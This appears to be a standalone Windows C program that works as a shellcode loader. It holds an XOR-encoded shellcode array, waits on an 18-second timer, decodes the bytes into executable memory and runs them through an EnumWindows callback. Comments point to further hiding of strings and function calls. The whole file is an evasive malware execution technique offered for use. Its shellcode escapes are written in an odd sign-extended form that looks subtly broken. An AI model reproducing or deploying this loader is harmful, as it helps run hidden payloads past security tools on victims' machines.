#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct 
{
	unsigned char * payload;
	int payloadSize;
	unsigned char key;
} TimerContext;

TimerContext g_context;

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);

int main(void)
{

	unsigned key = 's';
	unsigned char shellcode[] = 
	"\xffffff8f\x3b\xfffffff0\xffffff97\xffffff83\xffffff9b\xffffffb3\x73\x73\x73\x32\x22\x32\x23\x21\x22\x25\x3b\x42\xffffffa1\x16\x3b\xfffffff8\x21\x13\x3b\xfffffff8\x21\x6b\x3b\xfffffff8\x21\x53\x3b\xfffffff8\x01\x23\x3b\x7c\xffffffc4\x39\x39\x3e\x42\xffffffba\x3b\x42\xffffffb3\xffffffdf\x4f\x12\x0f\x71\x5f\x53\x32\xffffffb2\xffffffba\x7e\x32\x72\xffffffb2\xffffff91\xffffff9e\x21\x32\x22\x3b\xfffffff8\x21\x53\xfffffff8\x31\x4f\x3b\x72\xffffffa3\xfffffff8\xfffffff3\xfffffffb\x73\x73\x73\x3b\xfffffff6\xffffffb3\x07\x14\x3b\x72\xffffffa3\x23\xfffffff8\x3b\x6b\x37\xfffffff8\x33\x53\x3a\x72\xffffffa3\xffffff90\x25\x3b\xffffff8c\xffffffba\x32\xfffffff8\x47\xfffffffb\x3b\x72\xffffffa5\x3e\x42\xffffffba\x3b\x42\xffffffb3\xffffffdf\x32\xffffffb2\xffffffba\x7e\x32\x72\xffffffb2\x4b\xffffff93\x06\xffffff82\x3f\x70\x3f\x57\x7b\x36\x4a\xffffffa2\x06\xffffffab\x2b\x37\xfffffff8\x33\x57\x3a\x72\xffffffa3\x15\x32\xfffffff8\x7f\x3b\x37\xfffffff8\x33\x6f\x3a\x72\xffffffa3\x32\xfffffff8\x77\xfffffffb\x3b\x72\xffffffa3\x32\x2b\x32\x2b\x2d\x2a\x29\x32\x2b\x32\x2a\x32\x29\x3b\xfffffff0\xffffff9f\x53\x32\x21\xffffff8c\xffffff93\x2b\x32\x2a\x29\x3b\xfffffff8\x61\xffffff9a\x24\xffffff8c\xffffff8c\xffffff8c\x2e\x3b\xffffffc9\x72\x73\x73\x73\x73\x73\x73\x73\x3b\xfffffffe\xfffffffe\x72\x72\x73\x73\x32\xffffffc9\x42\xfffffff8\x1c\xfffffff4\xffffff8c\xffffffa6\xffffffc8\xffffff83\xffffffc6\xffffffd1\x25\x32\xffffffc9\xffffffd5\xffffffe6\xffffffce\xffffffee\xffffff8c\xffffffa6\x3b\xfffffff0\xffffffb7\x5b\x4f\x75\x0f\x79\xfffffff3\xffffff88\xffffff93\x06\x76\xffffffc8\x34\x60\x01\x1c\x19\x73\x2a\x32\xfffffffa\xffffffa9\xffffff8c\xffffffa6\x10\x12\x1f\x10\x5d\x16\x0b\x16\x73\x73";
	
	g_context.key = key;
	g_context.payload = shellcode;
	g_context.payloadSize = sizeof(shellcode);


	UINT_PTR timerId = SetTimer(NULL, 1, 18000, TimerProc);

	MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
	KillTimer(NULL, timerId);
		
	return 0;
}

VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
{
	for (int i = 0; i < g_context.payloadSize - 1; i++)
	{
		g_context.payload[i] = g_context.payload[i]^g_context.key;
	}
	// Encrypt DLL and function strings. 
	// Obfuscate function calls - using DLL pointer.
    HANDLE hAlloc = VirtualAlloc(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, g_context.payload, g_context.payloadSize);
    EnumWindows((WNDENUMPROC) hAlloc, (LPARAM) NULL);
};


